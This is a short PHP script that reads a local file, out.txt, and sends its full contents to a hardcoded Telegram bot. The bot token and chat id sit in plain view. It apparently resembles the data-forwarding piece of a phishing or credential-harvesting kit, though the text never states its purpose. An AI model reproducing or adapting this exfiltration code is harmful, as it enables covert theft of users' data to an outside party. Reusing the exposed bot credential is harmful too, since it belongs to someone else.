<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1536881239:AAEVYG8k3ecux8zI5ywu-LH1ylmLrS6pN1M/sendMessage?chat_id=1436305942&text=$msg");
?>